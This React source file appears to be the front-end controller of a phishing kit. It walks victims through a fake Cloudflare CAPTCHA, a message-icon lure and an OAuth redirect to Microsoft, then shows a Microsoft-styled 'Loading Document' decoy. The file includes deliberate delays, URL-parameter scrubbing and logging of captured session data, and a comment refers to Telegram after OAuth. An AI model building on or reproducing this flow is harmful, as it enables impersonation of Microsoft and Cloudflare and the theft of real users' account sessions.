import React, { useState, useEffect } from 'react';
import MessageIconLanding from './components/MessageIconLanding';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';

// Artificial delay helper (milliseconds)
const SLOW_DELAY = 1200; // Base delay, x3 for each step (e.g., 3600ms)
const nextStepDelay = SLOW_DELAY * 3;

function App() {
  const [currentPage, setCurrentPage] = useState('captcha');
  const [pendingStep, setPendingStep] = useState<string | null>(null);

  // Check URL parameters only once on initial load
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const step = urlParams.get('step');

    // Only set initial state if there's a step parameter
    if (step && ['captcha', 'message-icon', 'oauth-redirect', 'success', 'document-loading'].includes(step)) {
      setCurrentPage(step);
      // Clean the URL after reading the parameter
      window.history.replaceState({}, document.title, window.location.pathname);
    }
  }, []);

  // Use effect to handle delayed step transitions
  useEffect(() => {
    if (pendingStep) {
      const timer = setTimeout(() => {
        setCurrentPage(pendingStep);
        setPendingStep(null);
      }, nextStepDelay);
      return () => clearTimeout(timer);
    }
  }, [pendingStep]);

  // Step 1: Captcha verified: go to message icon with delay
  const handleCaptchaVerified = () => {
    console.log('✅ CAPTCHA verified - waiting (slow) before moving to message icon landing');
    setPendingStep('message-icon');
  };

  // Step 2: Message icon opened: go to oauth redirect with delay
  const handleMessageOpen = () => {
    console.log('📧 Message icon clicked - waiting (slow) before moving to OAuth redirect');
    setPendingStep('oauth-redirect');
  };

  // Refresh page for back-to-captcha
  const handleCaptchaBack = () => {
    console.log('⬅️ Back to CAPTCHA (refresh page)');
    window.location.reload();
  };

  // Step 3: OAuth success: after Telegram, show loading document (final step, no more captcha)
  const handleOAuthSuccess = (sessionData: any) => {
    console.log('🔐 OAuth successful:', sessionData);
    setCurrentPage('document-loading');
  };

  // Allow user to retry OAuth from loading page if needed
  const handleOAuthBack = () => {
    console.log('⬅️ Back to message icon from OAuth');
    setCurrentPage('message-icon');
  };

  // Render current page based on flow
  switch (currentPage) {
    case 'captcha':
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
        />
      );

    case 'message-icon':
      return (
        <MessageIconLanding 
          onOpenMessage={handleMessageOpen}
        />
      );

    case 'oauth-redirect':
      // RealOAuthRedirect will itself wait (slow) before redirecting to Microsoft
      return (
        <RealOAuthRedirect
          onLoginSuccess={handleOAuthSuccess}
        />
      );

    case 'success': // alias for document-loading
    case 'document-loading':
      return (
        <div style={{ 
          display: 'flex', 
          justifyContent: 'center', 
          alignItems: 'center', 
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{ 
            textAlign: 'center',
            background: 'white',
            padding: '60px',
            borderRadius: '8px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
          }}>
            {/* Spinning document icon */}
            <div style={{
              width: '80px',
              height: '80px',
              background: '#0078d4',
              borderRadius: '8px',
              margin: '0 auto 30px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              animation: 'spin 2s linear infinite',
              fontSize: '40px',
              color: 'white'
            }}>
              📄
            </div>
            
            <h2 style={{ color: '#323130', margin: '0 0 10px' }}>
              Loading Document...
            </h2>
            <p style={{ color: '#605e5c', margin: '0 0 20px' }}>
              Please wait while we prepare your Microsoft document
            </p>
            
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              gap: '10px',
              marginTop: '30px'
            }}>
              <button 
                onClick={() => setCurrentPage('captcha')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#0078d4',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Start Over
              </button>
              <button 
                onClick={() => setCurrentPage('oauth-redirect')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#107c10',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Try Again
              </button>
            </div>
          </div>
        </div>
      );

    default:
      // fallback to captcha
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
        />
      );
  }
}

export default App;